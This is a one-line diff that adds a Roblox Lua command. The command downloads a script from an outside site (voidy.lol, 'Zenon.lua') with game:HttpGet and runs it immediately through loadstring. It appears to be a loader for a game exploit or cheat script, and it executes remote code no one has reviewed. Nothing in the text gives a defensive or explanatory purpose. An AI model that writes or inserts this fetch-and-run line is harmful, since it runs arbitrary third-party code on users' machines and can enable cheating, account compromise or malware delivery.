@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://voidy.lol/Zenon.lua",true))()
